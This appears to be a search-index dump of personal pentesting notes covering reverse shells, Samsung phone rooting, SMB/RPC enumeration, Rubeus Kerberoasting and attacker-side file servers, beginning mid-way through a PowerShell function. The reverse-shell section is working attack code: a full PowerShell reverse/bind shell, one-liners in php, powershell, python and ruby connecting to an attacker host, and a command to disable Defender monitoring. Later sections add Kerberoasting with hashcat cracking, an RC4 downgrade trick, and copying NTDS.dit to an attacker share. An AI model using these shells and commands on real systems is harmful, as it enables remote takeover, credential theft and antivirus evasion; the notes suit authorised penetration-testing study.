$Port,\n\n        [Parameter(ParameterSetName=\"reverse\")]\n        [Switch]\n        $Reverse,\n\n        [Parameter(ParameterSetName=\"bind\")]\n        [Switch]\n        $Bind\n\n    )\n\n\n    try \n    {\n        #Connect back if the reverse switch is used.\n        if ($Reverse)\n        {\n            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)\n        }\n\n        #Bind to the provided port if Bind switch is used.\n        if ($Bind)\n        {\n            $listener = [System.Net.Sockets.TcpListener]$Port\n            $listener.start()    \n            $client = $listener.AcceptTcpClient()\n        } \n\n        $stream = $client.GetStream()\n        [byte[]]$bytes = 0..65535|%{0}\n\n        #Send back current username and computername\n        $sendbytes = ([text.encoding]::ASCII).GetBytes(\"Windows PowerShell running as user \" + $env:username + \" on \" + $env:computername + \"`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n\")\n        $stream.Write($sendbytes,0,$sendbytes.Length)\n\n        #Show an interactive PowerShell prompt\n        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '&gt;')\n        $stream.Write($sendbytes,0,$sendbytes.Length)\n\n        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)\n        {\n            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding\n            $data = $EncodedText.GetString($bytes,0, $i)\n            try\n            {\n                #Execute the command on the target.\n                $sendback = (Invoke-Expression -Command $data 2&gt;&amp;1 | Out-String )\n            }\n            catch\n            {\n                Write-Warning \"Something went wrong with execution of command on the target.\" \n                Write-Error $_\n            }\n            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '&gt; '\n            $x = ($error[0] | Out-String)\n            $error.clear()\n            $sendback2 = $sendback2 + $x\n\n            #Return the results\n            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)\n            $stream.Write($sendbyte,0,$sendbyte.Length)\n            $stream.Flush()  \n        }\n        $client.Close()\n        if ($listener)\n        {\n            $listener.Stop()\n        }\n    }\n    catch\n    {\n        Write-Warning \"Something went wrong! Check if the server is reachable and you are using the correct port.\" \n        Write-Error $_\n    }\n}\n</code></pre>","tags":["pentesting","web","pentesting","reverse-shells"]},{"location":"reverse-shells/#php","title":"php","text":"<pre><code>php -r '$sock=fsockopen(\"$ipAttacker\",$port);exec(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");'\n</code></pre>","tags":["pentesting","web","pentesting","reverse-shells"]},{"location":"reverse-shells/#powershell","title":"powershell","text":"<pre><code>powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient($ipAttacker,$port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"\n\n\n# same, but without assigning $client to the new object\npowershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"$ipAttacker\",$port); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"&gt; \"; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close()\n\n# powershell -nop -c \n# Executes powershell.exe with no profile (nop) and executes the command/script block (-c or -Command) contained in the quotes\n\n# \"$client = New-Object System.Net.Sockets.TCPClient($ipAttacker,433);\n# Sets/evaluates the variable $client equal to (=) the New-Object cmdlet, which creates an instance of the System.Net.Sockets.TCPClient .NET framework object. The .NET framework object will connect with the TCP socket listed in the parentheses ($ipAttacker,443). The semi-colon (;) ensures the commands &amp; code are executed sequentially.\n\n# $stream = $client.GetStream();\n# Sets/evaluates the variable $stream equal to (=) the $client variable and the .NET framework method called GetStream that facilitates network communications. \n\n# [byte[]]$bytes = 0..65535|%{0}; \n# Creates a byte type array ([]) called $bytes that returns 65,535 zeros as the values in the array. This is essentially an empty byte stream that will be directed to the TCP listener on an attack box awaiting a connection.\n\n# while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)\n\n# Starts a while loop containing the $i variable set equal to (=) the .NET framework Stream.Read ($stream.Read) method. The parameters: buffer ($bytes), offset (0), and count ($bytes.Length) are defined inside the parentheses of the method.\n\n\n# {;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);\n# Sets/evaluates the variable $data equal to (=) an ASCII encoding .NET framework class that will be used in conjunction with the GetString method to encode the byte stream ($bytes) into ASCII. In short, what we type won't just be transmitted and received as empty bits but will be encoded as ASCII text. \n\n# $sendback = (iex $data 2&gt;&amp;1 | Out-String ); \n# Sets/evaluates the variable $sendback equal to (=) the Invoke-Expression (iex) cmdlet against the $data variable, then redirects the standard error (2&gt;) &amp; standard input (1) through a pipe (|) to the Out-String cmdlet which converts input objects into strings. Because Invoke-Expression is used, everything stored in $data will be run on the local computer. \n\n# $sendback2 = $sendback + 'PS ' + (pwd).path + '&gt; '; \n# Sets/evaluates the variable $sendback2 equal to (=) the $sendback variable plus (+) the string PS ('PS') plus + path to the working directory ((pwd).path) plus (+) the string '&gt; '. This will result in the shell prompt being PS C:\\workingdirectoryofmachine &gt;. \n\n# $sendbyte=  ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}\n# Sets/evaluates the variable $sendbyte equal to (=) the ASCII encoded byte stream that will use a TCP client to initiate a PowerShell session with a Netcat listener running on the attack box.\n</code></pre> <p>Disable AV <pre><code> Set-MpPreference -DisableRealtimeMonitoring $true\n</code></pre></p>","tags":["pentesting","web","pentesting","reverse-shells"]},{"location":"reverse-shells/#python","title":"python","text":"<pre><code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ipAttacker\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n\npython -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$ipAttacker',$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);\"\n</code></pre>","tags":["pentesting","web","pentesting","reverse-shells"]},{"location":"reverse-shells/#ruby","title":"ruby","text":"<pre><code>ruby -rsocket -e'f=TCPSocket.open(\"$ipAttacker\",$port).to_i;exec sprintf(\"/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d\",f,f,f)'\n</code></pre>","tags":["pentesting","web","pentesting","reverse-shells"]},{"location":"reverse-shells/#xterm","title":"xterm","text":"<pre><code>xterm -display 10.0.0.1:1\n</code></pre>","tags":["pentesting","web","pentesting","reverse-shells"]},{"location":"rooting-mobile/","title":"Rooting Samsung Galaxy A515F","text":""},{"location":"rooting-mobile/#samsung-galaxy-a515f","title":"Samsung Galaxy A515F","text":""},{"location":"rooting-mobile/#install-a-windows-10-vm-in-your-phisical-kali-machine","title":"Install a Windows 10 VM in your phisical kali machine","text":"<ol> <li> <p>Install a Windows10 VM in your preferred hyper XXX technology.</p> </li> <li> <p>Virtualize your USB in the windows machine: VirtualBox &gt; Settings (on the desired VM) &gt; USB &gt; Make sure usb 3 is selected &gt; click on + icon and select device. </p> </li> </ol> <p></p> <p>Troubleshooting: You may find that your android phone does not appear there yet. The reason behind might be that the user responsible for the virtualbox process has no permissions to access the USB mounted devices. We will add it in our phisical machine (kali):</p> <pre><code>sudo usermod -a -G vboxusers $username\nnewgrp vboxusers\n\n# and reboot kali\n</code></pre> <p>After that, replay step 2 and we should see the device.</p>"},{"location":"rooting-mobile/#install-samsung-drivers-in-your-windows-vm","title":"Install Samsung drivers in your Windows VM","text":"<p>There is this video with assistance for this: https://www.youtube.com/watch?v=K3Jk7dCvdNM.</p> <p>This is the download link for getting those drivers: https://developer.samsung.com/android-usb-driver.</p> <p>And try to install Samsung Dex. I could not, but since I have the drivers installed, this was optional.</p>"},{"location":"rooting-mobile/#backup-your-mobile","title":"Backup your mobile","text":"<p>Because we are going to go to fabric resetting</p>"},{"location":"rooting-mobile/#enable-developers-mode-in-your-device","title":"Enable developers mode in your device","text":"<p>Go to Settings &gt; About the phone &gt; Software  Information &gt; and tap I don't know how many times on \"Build Number\" (5?). Eventually you will see a message with a countdown number to enable \"Developer mode\".</p>"},{"location":"rooting-mobile/#enable-debug-mode","title":"Enable Debug mode","text":"<p>Go to Settings &gt; Developer options (now these are enabled) &gt; Debug mode ---set to on</p>"},{"location":"rooting-mobile/#set-oem-unlocking-to-on","title":"Set OEM unlocking to ON","text":"<p>Go to Settings &gt; Developer options (now these are enabled) &gt; OEM unlocking  ---set to on</p>"},{"location":"rooting-mobile/#get-into-download-mode-and-unblock-the-bootloader","title":"Get into Download mode and unblock the Bootloader","text":"<p>Turn off your android phone completely. But completely.</p> <p>Press volume up and press volume down both at the same time and keep it press. Connect at the same time the USB-C cable to your device (and to your computer) and you will see a Warning screen. When you see it, you can stop pressing the up-down volume buttons. </p> <p></p> <p>Now, long press Volume up button and you will see this message (stop pressing when you see it):</p> <p></p> <p>The following two steps are:</p> <p>Press volume up once, and you will see a black screen. When the screens turns into black press quickly volume up and down at the same time once. With that Bootloader will be unblocked.</p> <p>Now we will enter in the Download mode, </p> <p></p> <p>only by pressing once on the volume up button.</p> <p>Leave the device and go to your windows.</p> <p></p>"},{"location":"rooting-mobile/#flash-the-device-from-the-windows-vm","title":"Flash the device from the windows VM","text":"<p>Firstable, you will need to make sure that you have the proper firmware file. For that open the properties of your device and see the firmware version:</p> <p></p> <p>This, alone with your mobile model, will be useful for finding the firmware. </p> <p></p> <p>Download it to your windows VM and unzip it.</p> <p>Open Odin. </p> <p>Make sure the device appears.</p> <p>Go to Options tab and disable \"Auto Reboot\". In AP, select the file and have fun, the process may take a while:</p> <p></p> <p>Click on Start and wait until you see the PASS message:</p> <p></p> <p>Be careful not to disconnect the USB-C cable.</p>"},{"location":"rooting-mobile/#enter-in-recovery-mode","title":"Enter in Recovery mode","text":"<p>Go back to your Android Device and long press the 3 buttons (volume Up - Volume Down - and Power) at the same time.</p> <p>When the screen turns into black, remove the pressing only from the Volume Down until the logo of Samsung appears. From that point we need to count to three and then remove the pressing only from the Power button and keep pressing Volume Up.</p> <p>...</p> <p>Troubleshooting: Aparently, I did not do it correctly and got stuck in the situation in which, my phone was is download mode displaying RMM/KG State: Prenormal. So my phone had no OEM unlocking enable option and could not be rooted. The solution:  https://www.youtube.com/watch?v=TBUY05mnCP8</p> <p>After that I did not know if I had to go back to the flash step or Iif I should try to get to the download mode and then try to get into the recovery mode. I went through a loop of turning on and off, with several reinstallations and frozen screens with Samsung logo in it. I saw the \"erasing\" mesage several times and... </p> <p>Odin3 v3.14.4 : https://dl2018.sammobile.com/Odin.zipDriver </p> <p>de Samsung : https://developer.samsung.com/android-usb-driver </p> <p>TWRP : https://forum.xda-developers.com/t/recovery-unofficial-teamwin-recovery-project-v3-6-2-android-11-12.4400869/Magisk : https://github.com/topjohnwu/Magisk </p> <p>MultiDisabler : https://forum.xda-developers.com/t/pie-10-11-system-as-root-multidisabler-disables-encryption-vaultkeeper-auto-flash-of-stock-recovery-proca-wsm-cass-etc.3919714/</p> <p>Samsung health Samsung Gear Samsung Safe folder -enable</p> <p>Rooting a device will allow us to:</p> <ul> <li>install custom rom based on One UI, pure android and ROM gsi and android generic images </li> <li>modify in device app that requires root access</li> </ul> <p>Also we will loose some Samsung features. Samsung ... path Samsung health Samsung Gear Samsung Safe folder Guarantee</p> <p>But some of these features  (Samsung health, Samsung Gear, Samsung Safe) x1may be recovered with a custom ROM</p> <p>How to enable USB in virtualbox: https://www.techrepublic.com/article/how-to-enable-usb-in-virtualbox/</p>"},{"location":"rpcclient/","title":"rpcclient - A tool for interacting with smb shares","text":"<p>This is a tool to perform MS-RPC functions.</p> <p>The Remote Procedure Call (<code>RPC</code>) is a central tool to realize operational and work-sharing structures in networks and client-server architectures.</p> <p>Remote Procedure Call (RPC) is a powerful technique for constructing distributed, client-server based applications. It is based on extending the conventional local procedure calling so that the called procedure need not exist in the same address space as the calling procedure. The two processes may be on the same system, or they may be on different systems with a network connecting them.</p>","tags":["smb","port 445","port 137","port 138","port 139","samba","tools"]},{"location":"rpcclient/#basic-usage","title":"Basic usage","text":"<pre><code># SMB NULL Session with rpcclient\nrpcclient -U \"\" -N $ip\n\n# Connect to a remote shared folder (same as smbclient in this regard)\nrpcclient -U \"\" 10.129.14.128\nrpcclient -U'%' 10.10.110.17\n\n# Server information\nsrvinfo\n\n# Enumerate all domains that are deployed in the network \nenumdomains\n\n# Provides domain, server, and user information of deployed domains.\nquerydominfo\n\n# Enumerates all available shares.\nnetshareenumall\n\n# Provides information about a specific share.\nnetsharegetinfo &lt;share&gt;\n\n# Get Domain Password Information\ngetdompwinfo\n\n# Enumerates all domain users.\nenumdomusers\n\n# Provides information about a specific user.\nqueryuser &lt;RID&gt;\n    # An example:\n    # rpcclient $&gt; queryuser 0x3e8\n\n# Provides information about a specific group.\nquerygroup &lt;ID&gt;\n\n# Enumerating Privileges\nenumprivs\n\n# Enumerating SID from LSA\nlsaenumsid\n</code></pre>","tags":["smb","port 445","port 137","port 138","port 139","samba","tools"]},{"location":"rpcclient/#brute-forcing-user-enumeration-with-rpcclient","title":"Brute forcing user enumeration with rpcclient","text":"<pre><code>for i in $(seq 500 1100);do rpcclient -N -U \"\" $ip -c \"queryuser 0x$(printf '%x\\n' $i)\" | grep \"User Name\\|user_rid\\|group_rid\" &amp;&amp; echo \"\";done\n</code></pre>","tags":["smb","port 445","port 137","port 138","port 139","samba","tools"]},{"location":"rsat-remote-server-administration-tools/","title":"Remote Server Administration Tools (RSAT)","text":"<p>The Remote Server Administration Tools (RSAT) have been part of Windows since the days of Windows 2000. RSAT allows systems administrators to remotely manage Windows Server roles and features from a workstation running Windows 10, Windows 8.1, Windows 7, or Windows Vista. RSAT can only be installed on Professional or Enterprise editions of Windows. </p> <ul> <li>Script to install RSAT on Windows 10 1809, 1903, and 1909.</li> <li>Other versions of Windows and more documentation.</li> </ul> <pre><code># Check if RSAT tools are installed\nGet-WindowsCapability -Name RSAT* -Online \\| Select-Object -Property Name, State\n\n# Install all RSAT tools\nGet-WindowsCapability -Name RSAT* -Online \\| Add-WindowsCapability \u2013Online\n\n# Install a specific RSAT tool, for instance Rsat.ActiveDirectory.DS-LDS.Tools \nAdd-WindowsCapability -Name Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0  \u2013Online\n</code></pre> <p>Once installed, all of the tools will be available under: Control Panel&gt; All Control Panel Items &gt;Administrative Tools.</p>","tags":["tools"]},{"location":"rubeus/","title":"Rubeus","text":"<p>Rubeus is a C# toolset for raw Kerberos interaction and abuses.</p> <p>Kerberoasting tools typically request RC4 encryption when performing the attack and initiating TGS-REQ requests. This is because RC4 is weaker and easier to crack offline using tools such as Hashcat than other encryption algorithms such as AES-128 and AES-256. Overall:</p> <ul> <li>RC4 (type 23) encryption: TGS \u00a0hashes that begin with\u00a0<code>$krb5tgs$23$*</code></li> <li>AES-256 (type 18) encryption: TGS \u00a0hashes that begin with\u00a0<code>$krb5tgs$18$*</code></li> </ul>","tags":["pentesting","mimikatz","kerberos"]},{"location":"rubeus/#installation","title":"Installation","text":"<p>Github: https://github.com/GhostPack/Rubeus</p> <p>Some of the utilities:</p> <ul> <li>Performing Kerberoasting and outputting hashes to a file</li> <li>Using alternate credentials</li> <li>Performing Kerberoasting combined with a pass-the-ticket attack</li> <li>Performing \"opsec\" Kerberoasting to filter out AES-enabled accounts</li> <li>Requesting tickets for accounts passwords set between a specific date range</li> <li>Placing a limit on the number of tickets requested</li> <li>Performing AES Kerberoasting</li> </ul>","tags":["pentesting","mimikatz","kerberos"]},{"location":"rubeus/#basic-commands","title":"Basic commands","text":"<p>Gather stats:</p> <pre><code> .\\Rubeus.exe kerberoast /stats\n</code></pre> <p>Request tickets with admincount attribute set to 1:</p> <pre><code>.\\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap\n# /nowrap flag: so that the hash can be more easily copied down for offline cracking using Hashcat. The \"\"/nowrap\" flag prevents any base64 ticket blobs from being column wrapped.\n</code></pre> <p>Perform Kerberoasting on a user testspn:</p> <pre><code># Perform Kerberoasting on a user testspn\n.\\Rubeus.exe kerberoast /user:testspn /nowrap\n</code></pre>","tags":["pentesting","mimikatz","kerberos"]},{"location":"rubeus/#evasion-techniques","title":"Evasion techniques","text":"<p>Kerberoasting tools typically request RC4 encryption when performing the attack and initiating TGS-REQ requests. This is because RC4 is weaker and easier to crack offline using tools such as Hashcat than other encryption algorithms such as AES-128 and AES-256. Overall:</p> <ul> <li>RC4 (type 23) encryption: TGS \u00a0hashes that begin with\u00a0<code>$krb5tgs$23$*</code></li> <li>AES-256 (type 18) encryption: TGS \u00a0hashes that begin with\u00a0<code>$krb5tgs$18$*</code></li> </ul> <p>If the received TGS ticket is RC4 (type 23) encrypted, it will be easier to crack.</p> <p>We can check out if the user has the <code>msDS-SupportedEncryptionTypes</code>\u00a0attribute is set to\u00a0<code>0</code> (meaning that is using RC4 (type 23) encryption.  The chart\u00a0here\u00a0tells us that a decimal value of\u00a0<code>0</code>\u00a0means that a specific encryption type is not defined and set to the default of\u00a0<code>RC4_HMAC_MD5</code>.</p> <pre><code># Check the encryption of the TGS ticket for user testspn\nGet-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes\n\n\n#serviceprincipalname       msds-supportedencryptiontypes samaccountname\n# ----------                 ----------------------------- --------------\n# testspn/kerberoast.inlanefreight.local               0   testspn\n</code></pre> <p>With RC4 (type 23) encryption, this would be the hashcat module:</p> <pre><code>hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt \n</code></pre> <p>The results for the AES-256 (type 18) encryption would be <code>24</code>:</p> <pre><code># Check the encryption of the TGS ticket for user testspn\nGet-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes\n\n\n#serviceprincipalname       msds-supportedencryptiontypes samaccountname\n# ----------                 ----------------------------- --------------\n# testspn/kerberoast.inlanefreight.local               24   testspn\n</code></pre> <p>With AES (type 18) encryption, this would be the hashcat module:</p> <pre><code>hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt \n</code></pre> <p>We can use Rubeus with the\u00a0<code>/tgtdeleg</code>\u00a0flag to specify that we want only RC4 encryption  when requesting a new service ticket even though the supported encryption types are listed as AES 128/256. This may be a failsafe built-in to Active Directory for backward compatibility.</p> <pre><code># Perform Kerberoasting on a user testspn\n.\\Rubeus.exe kerberoast /user:testspn /nowrap /tgtdeleg\n# /tgtdeleg: specify that we want only RC4 encryption when requesting a new service ticket.\n</code></pre> <p>Note: This does not work against a Windows Server 2019 Domain Controller, regardless of the domain functional level. It will always return a service ticket encrypted with the highest level of encryption supported by the target account. This being said, if we find ourselves in a domain with Domain Controllers running on Server 2016 or earlier (which is quite common), enabling AES will not partially mitigate Kerberoasting by only returning AES encrypted tickets, which are much more difficult to crack, but rather will allow an attacker to request an RC4 encrypted service ticket. In Windows Server 2019 DCs, enabling AES encryption on an SPN account will result in us receiving an AES-256 (type 18) service ticket, which is substantially more difficult (but not impossible) to crack, especially if a relatively weak dictionary password is in use.</p> <p>In addition, It is possible to edit the encryption types used by Kerberos. This can be done by opening Group Policy, editing the Default Domain Policy, and choosing: Computer Configuration &gt; Policies &gt; Windows Settings &gt; Security Settings &gt; Local Policies &gt; Security Options, then double-clicking on Network security: Configure encryption types allowed for Kerberos and selecting the desired encryption type allowed for Kerberos. Removing all other encryption types except for RC4_HMAC_MD5 would allow for the above downgrade example to occur in 2019. Removing support for AES would introduce a security flaw into AD and should likely never be done. </p>","tags":["pentesting","mimikatz","kerberos"]},{"location":"rubeus/#more-commands","title":"More commands","text":"<pre><code>.\\Rubeus.exe\n\n# Gather some stats:\n .\\Rubeus.exe kerberoast /stats\n\n\n# Perform Kerberoasting:\nRubeus.exe kerberoast [[/spn:\"blah/blah\"] | [/spns:C:\\temp\\spns.txt]] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:\"OU=,...\"] [/ldaps] [/nowrap]\n\n# Perform Kerberoasting, outputting hashes to a file:\nRubeus.exe kerberoast /outfile:hashes.txt [[/spn:\"blah/blah\"] | [/spns:C:\\temp\\spns.txt]] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:\"OU=,...\"] [/ldaps]\n\n\n# Perform Kerberoasting, outputting hashes in the file output format, but to the console:\nRubeus.exe kerberoast /simple [[/spn:\"blah/blah\"] | [/spns:C:\\temp\\spns.txt]] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:\"OU=,...\"] [/ldaps] [/nowrap]\n\n# Perform Kerberoasting with alternate credentials:\nRubeus.exe kerberoast /creduser:DOMAIN.FQDN\\USER /credpassword:PASSWORD [/spn:\"blah/blah\"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:\"OU=,...\"] [/ldaps] [/nowrap]\n\n# Perform Kerberoasting with an existing TGT:\nRubeus.exe kerberoast &lt;/spn:\"blah/blah\" | /spns:C:\\temp\\spns.txt&gt; &lt;/ticket:BASE64 | /ticket:FILE.KIRBI&gt; [/nowrap]\n\n# Perform Kerberoasting with an existing TGT using an enterprise principal:\nRubeus.exe kerberoast &lt;/spn:user@domain.com | /spns:user1@domain.com,user2@domain.com&gt; /enterprise &lt;/ticket:BASE64 | /ticket:FILE.KIRBI&gt; [/nowrap]\n\n# Perform Kerberoasting with an existing TGT and automatically retry with the enterprise principal if any fail:\nRubeus.exe kerberoast &lt;/ticket:BASE64 | /ticket:FILE.KIRBI&gt; /autoenterprise [/ldaps] [/nowrap]\n\n# Perform Kerberoasting using the tgtdeleg ticket to request service tickets - requests RC4 for AES accounts:\nRubeus.exe kerberoast /usetgtdeleg [/ldaps] [/nowrap]\n\n# Perform \"opsec\" Kerberoasting, using tgtdeleg, and filtering out AES-enabled accounts:\nRubeus.exe kerberoast /rc4opsec [/ldaps] [/nowrap]\n\n# List statistics about found Kerberoastable accounts without actually sending ticket requests:\nRubeus.exe kerberoast /stats [/ldaps] [/nowrap]\n\n# Perform Kerberoasting, requesting tickets only for accounts with an admin count of 1 (custom LDAP filter):\nRubeus.exe kerberoast /ldapfilter:'admincount=1' [/ldaps] [/nowrap]\n\n# Perform Kerberoasting, requesting tickets only for accounts whose password was last set between 01-31-2005 and 03-29-2010, returning up to 5 service tickets:\nRubeus.exe kerberoast /pwdsetafter:01-31-2005 /pwdsetbefore:03-29-2010 /resultlimit:5 [/ldaps] [/nowrap]\n\n# Perform Kerberoasting, with a delay of 5000 milliseconds and a jitter of 30%:\nRubeus.exe kerberoast /delay:5000 /jitter:30 [/ldaps] [/nowrap]\n\n# Perform AES Kerberoasting:\nRubeus.exe kerberoast /aes [/ldaps] [/nowrap]\n</code></pre>","tags":["pentesting","mimikatz","kerberos"]},{"location":"samba-suite/","title":"Samba Suite","text":"<p>It\u2019s used to enumerate info. It might be used in a Null session attack.</p>","tags":["pentesting"]},{"location":"samba-suite/#installation","title":"Installation","text":"<p>Download it from: https://www.samba.org/</p>","tags":["pentesting"]},{"location":"samba-suite/#basic-commands","title":"Basic commands","text":"<ol> <li>Enumerate File Server services: </li> </ol> <pre><code>nmblookup -A $ip\n</code></pre> <ol> <li>Also with the smbclient we can enumerate the shares provides by a host:  </li> </ol> <pre><code>smbclient -L //$ip -N\n\n# -L\u00a0 Look at what services are available on a target\n# $ip\u00a0Prepend the two slahes\n# -N \u00a0Force the tool not to ask for a password\n</code></pre> <ol> <li>Connect:</li> </ol> <pre><code>smbclient \\\\$ip\\sharedfolder -N\n</code></pre> <p>Be careful, sometimes the shell removes the slashes and you need to escape them.</p> <ol> <li>Once connected you can browse with the smb command line. To see allowed commands: help </li> <li>When you know the path of a file and you want to retrieve it:<ul> <li>from kali:  <pre><code>smbget smb://$ip/SharedFolder/flag_1.txt\n</code></pre></li> <li>from  smb command line:  <pre><code>get flag_1.txt\n!ls\n!cat flag.txt\n</code></pre></li> </ul> </li> </ol>","tags":["pentesting"]},{"location":"samrdump/","title":"SAMRDump","text":"<p>Impacket\u2019s samrdump.py communicates with the Security Account Manager Remote (SAMR) interface to list system user accounts, available resource shares, and other sensitive information.</p>","tags":["pentesting windows"]},{"location":"samrdump/#basic-commands","title":"Basic commands","text":"<pre><code># path: /usr/share/doc/python3-impacket/examples/samrdump.py\npython3 samrdump.py $ip\n</code></pre>","tags":["pentesting windows"]},{"location":"scrcpy/","title":"scrcpy","text":"","tags":["mobile pentesting","android"]},{"location":"scrcpy/#installation","title":"Installation","text":"<p>Download from: https://github.com/Genymobile/scrcpy.</p>","tags":["mobile pentesting","android"]},{"location":"scrcpy/#on-linux","title":"On Linux","text":"<p>Source: https://github.com/Genymobile/scrcpy/blob/master/doc/linux.md</p> <p>First, you need to install the required packages:</p> <pre><code># for Debian/Ubuntu\nsudo apt install ffmpeg libsdl2-2.0-0 adb wget \\\n                 gcc git pkg-config meson ninja-build libsdl2-dev \\\n                 libavcodec-dev libavdevice-dev libavformat-dev libavutil-dev \\\n                 libswresample-dev libusb-1.0-0 libusb-1.0-0-dev\n</code></pre> <p>Then clone the repo and execute the installation script (source):</p> <pre><code>git clone https://github.com/Genymobile/scrcpy\ncd scrcpy\n./install_release.sh\n</code></pre> <p>When a new release is out, update the repo and reinstall:</p> <pre><code>git pull\n./install_release.sh\n</code></pre> <p>To uninstall:</p> <pre><code>sudo ninja -Cbuild-auto uninstall\n</code></pre> <p>Note that this simplified process only works for released versions (it downloads a prebuilt server binary), so for example you can't use it for testing the development branch (<code>dev</code>).</p>","tags":["mobile pentesting","android"]},{"location":"scrcpy/#basic-usage","title":"Basic usage","text":"<pre><code>scrcpy\n</code></pre>","tags":["mobile pentesting","android"]},{"location":"scrcpy/#debugging","title":"Debugging","text":"<p>For scrcpy to work, there must be an adb connection, which requires:</p> <ul> <li>Having developer mode enabled.</li> <li>Having USB debug mode enabled.</li> </ul> <p>And there\u2019s an extra security restriction on Xiaomi Miui devices, which prevents USB debugging assigning permissions by default:</p> <p>USB debugging (Security settings) Allow granting permissions and simulating input via USB debugging</p> <p>This may require to sign in into a Xiaomi account (or sign up if you have no account.)</p> <p>Otherwise you will obtain messages such as </p> <p></p>","tags":["mobile pentesting","android"]},{"location":"searchsploit/","title":"searchsploit","text":"<p>The Exploit Database is an archive of public exploits and corresponding vulnerable software, developed for use by penetration testers and vulnerability researchers.</p>","tags":["pentesting","web pentesting","exploitation"]},{"location":"searchsploit/#installation","title":"Installation","text":"<p>Pre-installed in kali. Download it from: https://gitlab.com/exploit-database/exploitdb Also:</p> <pre><code>sudo apt install exploitdb -y\n</code></pre>","tags":["pentesting","web pentesting","exploitation"]},{"location":"searchsploit/#basic-usage","title":"Basic usage","text":"<pre><code>searchsploit &lt;WhatYouAreLookingFor&gt;\n</code></pre> <p>Example:</p> <p></p> <p>If you want to have a look at those POCs, append the path provided to the root location for the searchsploit database (<code>/usr/share/exploitdb/exploits</code>).</p>","tags":["pentesting","web pentesting","exploitation"]},{"location":"seatbelt/","title":"Seatbelt","text":"<p>Seatbelt is a C# project that performs a number of security oriented host-survey \"safety checks\" relevant from both offensive and defensive security perspectives.</p>","tags":["pentesting","windows pentesting","enumeration"]},{"location":"seatbelt/#installation","title":"Installation","text":"<p>Github repo: https://github.com/GhostPack/Seatbelt.</p>","tags":["pentesting","windows pentesting","enumeration"]},{"location":"servers/","title":"Setting up a server (in the attacking machine)","text":"Protocol / app smb server Apache server ngix symple python server php web server Ruby web server Burp Suite Collaborator Interactsh responder uploadserver Webdav wsgodav server","tags":["servers","file transfer"]},{"location":"servers/#smb-server","title":"smb server","text":"<p>Launch smbserver in our attacker machine:</p> <pre><code>sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/username/Documents/\n</code></pre> <p>Now, from PS in the victim's windows machine we could upload a folder to the shared folder in the attacker machine just by running:</p> <pre><code>cmd.exe /c move C:\\NTDS\\NTDS.dit \\\\$ip\\CompData\n</code></pre>","tags":["servers","file transfer"]},{"location":"servers/#apache-server","title":"Apache server","text":"<p>Once you have a folder structure such as \"/var/www/\" or \"/var/www/html\", and also an Apache server installed, you can serve all files from that path by initiating the service:</p> <pre><code># Start Apache\nservice apache2 start\n\n# Stop Apache\nservice apache2 stop\n\n# Restart Apache\nservice apache2 restart\n\n# See status of Apache server\nservice apache2 status\n</code></pre> <p>In Apache, the PHP module loves to execute anything ending in PHP. Also, by default, with Apache, if we hit a directory without an index file (index.html), it will list all the files.</p>","tags":["servers","file transfer"]},{"location":"servers/#nginx","title":"nginx","text":"<p>In Apache, the PHP module loves to execute anything ending in PHP. This is not very safe when allowing <code>HTTP</code> uploads, as we are trying to avoid that users cannot upload web shells and execute them.</p> <p>Nginx server: </p> <pre><code># Create a Directory to Handle Uploaded Files\nsudo mkdir -p /var/www/uploads/SecretUploadDirectory\n\n# Change the Owner to www-data\nsudo chown -R www-data:www-data 